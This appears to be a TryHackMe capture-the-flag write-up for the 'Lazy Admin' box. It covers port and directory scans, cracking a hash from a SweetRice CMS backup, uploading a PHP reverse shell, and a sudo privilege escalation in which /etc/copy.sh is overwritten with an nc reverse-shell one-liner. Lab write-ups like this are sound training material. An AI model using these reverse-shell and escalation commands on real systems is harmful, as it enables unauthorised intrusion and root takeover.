# TryHackMe Lazy Admin Walkthrough

## 1. Enumeration

### Nmap Scan

```sh
nmap -p- -sV -sC -T4 -o nmap-res 10.10.18.100

```
**Results:**
- **22/tcp** - OpenSSH 7.2p2 (Ubuntu Linux)
- **80/tcp** - Apache 2.4.18 (Ubuntu)

### Gobuster Directory Scan
```sh
gobuster dir -u http://10.10.18.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

```
**Found Directories:**
- `/content/`
- `/server-status/ (403 Forbidden)`

```sh
gobuster dir -u http://10.10.18.100/content/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

```
**Also searchsploit will revel vuln on backups in the /inc/mysql_backup**


**Found Directories in `/content/`**:
- `/content/as/` (Login Page)
- `/content/inc/` (Contains MySQL Backup)

## 2. Exploiting SweetRice CMS

### Extracting Credentials from MySQL Backup
```sh
cat backup.sql | grep "passwd"
```
**Found Hash:** `42f749ade7f9e195bf475f37a44cafcb`

```sh
hashcat -m 0 hash.txt rockyou.txt --force
```
**Recovered Password:** `Password123`
**Username:** `manager`

### Logging into SweetRice Admin Panel
- **URL:** `http://10.10.18.100/content/as/`
- **Credentials:**
  ```plaintext
  Username: manager
  Password: Password123
  ```
- **Enable URL Rewrite & Change Site Status**
- **Upload Reverse Shell via Post Option**
  ```sh
  nc -nvlp 4444
  ```
- **Execute Shell:** `http://10.10.18.100/content/attachment/shell.php5`

## 3. Privilege Escalation

### Checking Users with Shell Access
```sh
awk -F: '$NF ~ /bash$/ {print $1}' /etc/passwd
```
**Users Found:**
- `root`
- `itguy`
- `guest-3myc2b`

### Checking `sudo -l` Permissions
```sh
sudo -l
```
**Permissions:**
```plaintext
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
- This script calls `/etc/copy.sh`

### Modifying `/etc/copy.sh` to Get a Root Shell
```sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tmp/f' > /etc/copy.sh
```
- **Replace `<local-ip>` with Attack Machine IP**
- **Start Netcat Listener on Kali:**
  ```sh
  nc -lvnp 5554
  ```
- **Execute the Script as Root:**
  ```sh
  /usr/bin/perl /home/itguy/backup.pl
  ```

## 4. Root Shell Access

### Confirm Root
```sh
whoami
id
cat /root/root.txt
```

## User flag is in itguy/user.txt

### Upgrade Shell
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Walkthrough Complete!** 🚀


